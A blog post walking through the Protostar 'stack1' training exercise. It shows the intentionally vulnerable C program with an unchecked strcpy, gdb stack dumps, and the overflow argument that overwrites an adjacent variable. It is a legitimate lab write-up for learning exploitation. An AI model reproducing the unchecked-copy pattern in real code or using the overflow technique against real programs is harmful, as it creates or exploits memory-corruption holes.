---
layout: post
title:  "Protostar Stack1"
date:   2023-03-15 09:00:00 +1100
categories: Journey
tags: 
---

However ineloquent, I simple brute forced this one.

Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

I simple need to find a way to force an area in the stack, where currently exist `0x00000000` (default output) to equal `0x61626364`. As the stack runs bottom up, we need to insert the values `0x64636261` what are `dcba` in ascii. 

```python
>>> chr(0x64)
'd'
>>> chr(0x63)
'c'
>>> chr(0x62)
'b'
>>> chr(0x61)
'a'
```

I added breakpoints to the `call   0x8048368 <strcpy@plt>` and `mov    eax,DWORD PTR [esp+0x5c]` lines, so that I can see the stack pre input, post input and pre comparison.

When run with `set args dcba` we can see a few things:
```bash
0xbffff760:     0xbffff77c      0xbffff9a4      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0x61626364
0xbffff780:     0xb7fd7f00      0x080496fc      0xbffff798      0x08048334
0xbffff790:     0xb7ff1040      0x080496fc      0xbffff7c8      0x08048509
0xbffff7a0:     0xb7fd8304      0xb7fd7ff4      0x080484f0      0xbffff7c8
0xbffff7b0:     0xb7ec6365      0xb7ff1040      0x080484fb      0x00000000
0xbffff7c0:     0x080484f0      0x00000000      0xbffff848      0xb7eadc76
0xbffff7d0:     0x00000002      0xbffff874      0xbffff880      0xb7fe1848
0xbffff7e0:     0xbffff830      0xffffffff      0xb7ffeff4      0x08048281
0xbffff7f0:     0x00000001      0xbffff830      0xb7ff0626      0xb7fffab0
0xbffff800:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff810:     0xbffff848      0x23a0868e      0x09f7509e      0x00000000
```

In the second line we see `0x61626364` and we see two lines with `0x00000000` within them, i assume to be the targets to buffer overflow into. I overflowed the stack right up to the first `0x00000000` on line `0xbffff7b0` and voila, we have the desired output!
```bash
(gdb) set args dcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcba
(gdb) r
Starting program: /opt/protostar/bin/stack1 dcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcba
eax            0xbffff73c       -1073744068
ecx            0xe3ef9174       -470838924
edx            0x2      2
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff720       0xbffff720
ebp            0xbffff788       0xbffff788
esi            0x0      0
edi            0x0      0
eip            0x80484a2        0x80484a2 <main+62>
eflags         0x200282 [ SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff720:     0xbffff73c      0xbffff964      0xb7fff8f8      0xb7f0186e
0xbffff730:     0xb7fd7ff4      0xb7ec6165      0xbffff748      0xb7eada75
0xbffff740:     0xb7fd7ff4      0x080496fc      0xbffff758      0x08048334
0xbffff750:     0xb7ff1040      0x080496fc      0xbffff788      0x08048509
0xbffff760:     0xb7fd8304      0xb7fd7ff4      0x080484f0      0xbffff788
0xbffff770:     0xb7ec6365      0xb7ff1040      0x080484fb      0x00000000
0xbffff780:     0x080484f0      0x00000000      0xbffff808      0xb7eadc76
0xbffff790:     0x00000002      0xbffff834      0xbffff840      0xb7fe1848
0xbffff7a0:     0xbffff7f0      0xffffffff      0xb7ffeff4      0x08048281
0xbffff7b0:     0x00000001      0xbffff7f0      0xb7ff0626      0xb7fffab0
0xbffff7c0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff7d0:     0xbffff808      0xc9b8c764      0xe3ef9174      0x00000000
0x80484a2 <main+62>:    call   0x8048368 <strcpy@plt>
0x80484a7 <main+67>:    mov    eax,DWORD PTR [esp+0x5c]

Breakpoint 1, 0x080484a2 in main (argc=2, argv=0xbffff834) at stack1/stack1.c:16
16      in stack1/stack1.c
(gdb) c
Continuing.
eax            0xbffff73c       -1073744068
ecx            0x0      0
edx            0x45     69
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff720       0xbffff720
ebp            0xbffff788       0xbffff788
esi            0x0      0
edi            0x0      0
eip            0x80484a7        0x80484a7 <main+67>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff720:     0xbffff73c      0xbffff964      0xb7fff8f8      0xb7f0186e
0xbffff730:     0xb7fd7ff4      0xb7ec6165      0xbffff748      0x61626364
0xbffff740:     0x61626364      0x61626364      0x61626364      0x61626364
0xbffff750:     0x61626364      0x61626364      0x61626364      0x61626364
0xbffff760:     0x61626364      0x61626364      0x61626364      0x61626364
0xbffff770:     0x61626364      0x61626364      0x61626364      0x61626364
0xbffff780:     0x08048400      0x00000000      0xbffff808      0xb7eadc76
0xbffff790:     0x00000002      0xbffff834      0xbffff840      0xb7fe1848
0xbffff7a0:     0xbffff7f0      0xffffffff      0xb7ffeff4      0x08048281
0xbffff7b0:     0x00000001      0xbffff7f0      0xb7ff0626      0xb7fffab0
0xbffff7c0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff7d0:     0xbffff808      0xc9b8c764      0xe3ef9174      0x00000000
0x80484a7 <main+67>:    mov    eax,DWORD PTR [esp+0x5c]
0x80484ab <main+71>:    cmp    eax,0x61626364

Breakpoint 2, main (argc=2, argv=0xbffff834) at stack1/stack1.c:18
18      in stack1/stack1.c
(gdb) c
Continuing.
you have correctly got the variable to the right value
```

We can also simplify this into a single line with below:
```bash
user@protostar:/tmp$ /opt/protostar/bin/stack1 dcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcba
you have correctly got the variable to the right value
```

You can see this in action if you run this without 1 or 2 values:
```bash
user@protostar:/tmp$ /opt/protostar/bin/stack1 dcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadc
Try again, you got 0x00006364
```